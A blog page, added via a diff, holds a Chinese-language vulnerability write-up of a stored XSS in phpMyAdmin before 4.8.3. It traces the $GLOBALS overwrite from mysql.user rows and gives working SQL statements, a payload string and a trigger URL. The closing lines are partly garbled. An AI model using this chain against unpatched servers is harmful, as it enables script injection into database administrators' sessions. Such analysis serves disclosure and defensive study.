@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpmyadmin &lt; 4.8.3 XSS一、漏洞简介最近在审计phpmyadmin的时候发现了一个XSS漏洞，后来发现在版本大于4.8.3以后该漏洞被修复了。看了下之前公布的CVE，有个CVE和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。 二、漏洞影响Phpmyadmin &lt; 4.8.3 三、复现过程在审计phpmyadmin时，我比较关注$GLOBALS全局变量，该变量存储">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Phpmyadmin/Phpmyadmin%20_%204.8.3%20XSS/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpmyadmin &lt; 4.8.3 XSS一、漏洞简介最近在审计phpmyadmin的时候发现了一个XSS漏洞，后来发现在版本大于4.8.3以后该漏洞被修复了。看了下之前公布的CVE，有个CVE和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。 二、漏洞影响Phpmyadmin &lt; 4.8.3 三、复现过程在审计phpmyadmin时，我比较关注$GLOBALS全局变量，该变量存储">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpmyadmin%3C4.8.3XSS/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpmyadmin%3C4.8.3XSS/media/rId26.png">
+<meta property="article:published_time" content="2022-07-08T06:26:02.034Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Phpmyadmin%3C4.8.3XSS/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Phpmyadmin/Phpmyadmin _ 4.8.3 XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20_%204.8.3%20XSS/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.034Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpmyadmin-lt-4-8-3-XSS"><a href="#Phpmyadmin-lt-4-8-3-XSS" class="headerlink" title="Phpmyadmin &lt; 4.8.3 XSS"></a>Phpmyadmin &lt; 4.8.3 XSS</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>最近在审计phpmyadmin的时候发现了一个XSS漏洞，后来发现在版本大于4.8.3以后该漏洞被修复了。看了下之前公布的CVE，有个CVE和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpmyadmin &lt; 4.8.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在审计phpmyadmin时，我比较关注$GLOBALS全局变量，该变量存储了本次请求的信息、phpmyadmin基本设置信息和phpmyadmin配置文件信息等。先看看/libraries/classes/Server/Privileges.php::3977的以下代码。</p>
+<pre><code>foreach ($row as $key =&gt; $value) &#123;
+    $GLOBALS[$key] = $value;
+&#125;
+</code></pre>
+<p>很明显，该处是$GLOBALS的赋值操作，而$row来自于对mysql.user表的查询结果，且$user_host_condition可控，/libraries/classes/Server/Privileges.php::3966行</p>
+<pre><code>public static function getDataForChangeOrCopyUser()
+    &#123;
+        $queries = null;
+        $password = null;
+
+        if (isset($_REQUEST[&#39;change_copy&#39;])) &#123;
+            $user_host_condition = &#39; WHERE `User` = &#39;
+                . &quot;&#39;&quot; . $GLOBALS[&#39;dbi&#39;]-&gt;escapeString($_REQUEST[&#39;old_username&#39;]) . &quot;&#39;&quot;
+                . &#39; AND `Host` = &#39;
+                . &quot;&#39;&quot; . $GLOBALS[&#39;dbi&#39;]-&gt;escapeString($_REQUEST[&#39;old_hostname&#39;]) . &quot;&#39;;&quot;;
+            $row = $GLOBALS[&#39;dbi&#39;]-&gt;fetchSingleRow(
+                &#39;SELECT * FROM `mysql`.`user` &#39; . $user_host_condition
+            );
+</code></pre>
+<p>既然上述代码会将mysql.user中符合条件的行的列名和值写入$GLOBALS中,我们便可通过添加mysql.user的列来往$GLOBALS中写入任意键值。清楚思路后，我们看看哪里调用了Privileges.php的getDataForChangeOrCopyUser函数,发现在server_privileges.php::178中对该函数有调用。</p>
+<pre><code>list($queries, $password) = Privileges::getDataForChangeOrCopyUser();
+</code></pre>
+<p>这时我们来试试向$GLOBALS中写一个$GLOBALS[&#39;xz&#39;]=&#39;aliyun&#39;。进入mysql库，执行以下2条sql语句向user表添加xz字段，并插入一条数据。</p>
+<pre><code>ALTER TABLE user ADD xz varchar(255);
+INSERT INTO `user` (`Host`, `User`, `Password`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Reload_priv`, `Shutdown_priv`, `Process_priv`, `File_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Show_db_priv`, `Super_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Execute_priv`, `Repl_slave_priv`, `Repl_client_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Create_user_priv`, `Event_priv`, `Trigger_priv`, `Create_tablespace_priv`, `ssl_type`, `max_questions`, `max_updates`, `max_connections`, `max_user_connections`, `plugin`, `authentication_string`, `xz`) VALUES (&#39;127.0.0.1&#39;, &#39;test&#39;, &#39;*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;&#39;, &#39;&#39;, &#39;aliyun&#39;);
+</code></pre>
+<p>在/libraries/classes/Server/Privileges.php::3980下断点</p>
+<pre><code>$serverVersion = $GLOBALS[&#39;dbi&#39;]-&gt;getVersion();
+</code></pre>
+<p>然后构造<a target="_blank" rel="noopener" href="http://127.0.0.1/phpMyAdmin-4.8.2/server/_privileges.php?change%5C_copy=aa&amp;old%5C_username=test&amp;old%5C_hostname=127.0.0.1&amp;mode=5">http://127.0.0.1/phpMyAdmin-4.8.2/server\_privileges.php?change\_copy=aa&amp;old\_username=test&amp;old\_hostname=127.0.0.1&amp;mode=5</a><br>参数请求，change_copy随便给个参数即可，mode必须大于4否则新添加的数据会被删除。</p>
+<p><img src="/resource/Phpmyadmin%3C4.8.3XSS/media/rId24.png" alt="1.png">可以看到$GLOBALS[&#39;xz&#39;]=&#39;aliyun&#39;已经成功赋值。</p>
+<h3 id="利用构造"><a href="#利用构造" class="headerlink" title="利用构造"></a>利用构造</h3><p>有了可控的$GLOBALS变量后，我们需要寻找触发点。要在一次请求便触发漏洞，公共页面是首选目标。通过全局搜索$GLOBALS变量，发现在libraries/classes/Navigation/NavigationTree.php::1272的renderDbSelect函数中有使用未过滤的$GLOBALS变量。</p>
+<pre><code>$retval .= &#39;&lt;div&gt;&#39;;
+        $retval .= &#39;&lt;form action=&quot;index.php&quot;&gt;&#39;;
+        $retval .= Url::getHiddenFields($url_params);
+        $retval .= &#39;&lt;select name=&quot;db&quot; class=&quot;hide&quot; id=&quot;navi_db_select&quot;&gt;&#39;
+            . &#39;&lt;option value=&quot;&quot; dir=&quot;&#39; . $GLOBALS[&#39;text_dir&#39;] . &#39;&quot;&gt;&#39;
+</code></pre>
+<p>继续搜索调用renderDbSelect函数地方，发现libraries\classes\Navigation\Navigation.php::62的getDisplay函数。</p>
+<pre><code>public function getDisplay()
+    &#123;
+        /* Init */
+        $retval = &#39;&#39;;
+        $response = Response::getInstance();
+        if (! $response-&gt;isAjax()) &#123;
+            $header = new NavigationHeader();
+            $retval = $header-&gt;getDisplay();
+        &#125;
+        $tree = new NavigationTree();
+        if (! $response-&gt;isAjax()
+            || ! empty($_REQUEST[&#39;full&#39;])
+            || ! empty($_REQUEST[&#39;reload&#39;])
+        ) &#123;
+            if ($GLOBALS[&#39;cfg&#39;][&#39;ShowDatabasesNavigationAsTree&#39;]) &#123;
+                // provide database tree in navigation
+                $navRender = $tree-&gt;renderState();
+            &#125; else &#123;
+                // provide legacy pre-4.0 navigation
+                $navRender = $tree-&gt;renderDbSelect();
+</code></pre>
+<p>继续搜索实例化Naviagtion类并且调用了getDisplay函数的地方，发现libraries\classes\Header.php::440的getDisplay函数有调用。</p>
+<pre><code>public function getDisplay()
+    &#123;
+        $retval = &#39;&#39;;
+        ...(省略)
+                if ($this-&gt;_menuEnabled &amp;&amp; $GLOBALS[&#39;server&#39;] &gt; 0) &#123;
+                    $nav = new Navigation();
+                    $retval .= $nav-&gt;getDisplay();
+                &#125;
+</code></pre>
+<p>搜索实例化Header-&gt;GetDisplay的方法，发现\libraries\classes\Response.php::100的构造方法中实例化了Header类，而$this-_header又在_getDisplay中被调用。_getDisplay被_htmlResponse调用，_htmlResponse在response函数中被调用。</p>
+<pre><code>private function __construct()
+    &#123;
+        if (! defined(&#39;TESTSUITE&#39;)) &#123;
+            $buffer = OutputBuffering::getInstance();
+            $buffer-&gt;start();
+            register_shutdown_function(array($this, &#39;response&#39;));
+        &#125;
+        $this-&gt;_header = new Header();
+        $this-&gt;_HTML   = &#39;&#39;;
+        $this-&gt;_JSON   = array();
+</code></pre>
+<p>\libraries\classes\Response.php::266行</p>
+<pre><code>private function _getDisplay()
+    &#123;
+        // The header may contain nothing at all,
+        // if its content was already rendered
+        // and, in this case, the header will be
+        // in the content part of the request
+        $retval  = $this-&gt;_header-&gt;getDisplay();
+        $retval .= $this-&gt;_HTML;
+        $retval .= $this-&gt;_footer-&gt;getDisplay();
+        return $retval;
+    &#125;
+</code></pre>
+<p>\libraries\classes\Response.php::279行</p>
+<pre><code>private function _htmlResponse()
+    &#123;
+        echo $this-&gt;_getDisplay();
+    &#125;
+</code></pre>
+<p>\libraries\classes\Response.php::438行</p>
+<pre><code>public function response()
+    &#123;
+        chdir($this-&gt;getCWD());
+        $buffer = OutputBuffering::getInstance();
+        if (empty($this-&gt;_HTML)) &#123;
+            $this-&gt;_HTML = $buffer-&gt;getContents();
+        &#125;
+        if ($this-&gt;isAjax()) &#123;
+            $this-&gt;_ajaxResponse();
+        &#125; else &#123;
+            $this-&gt;_htmlResponse();
+        &#125;
+        $buffer-&gt;flush();
+        exit;
+    &#125;
+</code></pre>
+<p>这里注意__construct中的register_shutdown_function函数，看php<br>manual，意思是说当脚本运行结束或遇到exit后会执行该response函数，<img src="/resource/Phpmyadmin%3C4.8.3XSS/media/rId26.png" alt="2.png"><strong>意思就是说只要哪里实例化了Response类，在程序运行结束后就会执行response函数</strong>。真好，回到server_privileges.php::34行，发现有实例化Response。</p>
+<pre><code>$response = Response::getInstance();
+$header   = $response-&gt;getHeader();
+$scripts  = $header-&gt;getScripts();
+</code></pre>
+<p>拥有以上调用链后，只需要控制$GLOBAS的键为text_dir,值为XSS<br>payload即可，进入mysql库，执行以下sql语句修改列名xz为text_dir，并修改数据为XSS<br>Payload。</p>
+<pre><code>ALTER TABLE `user` CHANGE `xz` `text_dir` VARCHAR(255) CHARACTER SET utf8 COLLATE utf8_bin NULL DEFAULT NULL;
+UPDATE `user` SET `text_dir` = &#39;\&quot;&gt;&lt;img src&gt;&lt;option dir=\&quot;&#39; WHERE `user`.`Host` = &#39;127.0.0.1&#39; AND `user`.`User` = &#39;test&#39;;
+</code></pre>
+<p>构造<a target="_blank" rel="noopener" href="https://wiki.0-sec.org/img">https://wiki.0-sec.org/img</a><br>src=&quot;<a target="_blank" rel="noopener" href="https://wiki.0-sec.org/img/69c5e770161c4eaeb6d839977209edf2.png/&quot;">https://wiki.0-sec.org/img/69c5e770161c4eaeb6d839977209edf2.png\&quot;</a><br>alt=&quot;3.png&quot; class=&quot;large&quot; onclick=&quot;window.open(this.src)&quot; /&gt;成功触发XSS</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7797">https://xz.aliyun.com/t/7797</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/Phpmyadmin%20_%204.8.3%20XSS/" data-id="cl5c2quaq00eay8v16qdfckqr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20%E7%88%86%E8%B7%AF%E5%BE%84/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
